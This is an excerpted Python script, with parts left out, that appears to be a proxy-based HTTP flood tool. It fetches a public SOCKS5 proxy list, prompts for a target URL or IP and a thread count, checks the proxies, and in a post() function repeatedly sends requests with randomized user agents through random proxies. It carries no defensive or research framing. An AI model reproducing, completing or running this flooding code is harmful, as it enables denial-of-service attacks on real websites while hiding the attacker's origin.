...
def clone():
    ...
    try:
        r = requests.get("https://api.proxyscrape.com/?request=getproxies&proxytype=socks5&timeout=10000&country=all")
        f.write(r.content)
    except:
        pass
    try:
        ...
        f.close()
    print("[✓] Socks5 Downloaded Sucessful !")
...
def main():
    ...
    ip = str(input("[+] URL / IP ( example.com ) : "))
    if ip == "":
    ...
    if th_num == "":
        ...
        th_num = int(th_num)
    #if mode == "get" or mode == "GET":
    N = str(input("[+] Download Socks5 List ? ( y / n Default = y ) : "))
    if N == "n" or N =="N":
        pass
    else:
        clone()
    out_file = str(input("[+] Enter Proxy File Path ( Default = socks5.txt ) : "))
    if out_file == "":
        out_file = "socks5.txt"
    else:
    ...
    time.sleep(0.3)
    ans = str(input("[?] Check The Socks5 List ? ( y / n Default = y ) : "))
    if ans == "n" or ans =="N":
        pass
    else:
        ms = str(input("[+] Delay Of Socks5 ( Seconds Default = 1 ) : "))
        if ms == "":
            ms = int(1)
        else :
            ms = int(ms)
...
def post():
    ...
    accept = random.choice(acceptall)
    ua = random.choice(useragents)
    request = post_host + ua + accept + connection
    proxy = random.choice(proxies).strip().split(":")
    while 1:
        try:
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
...
def check_socks():
	...
	for lines in list(proxies):
		...
		time.sleep(0.01)
		sys.stdout.write("[+] Checked "+str(nums)+" Socks5\r")
		sys.stdout.flush()
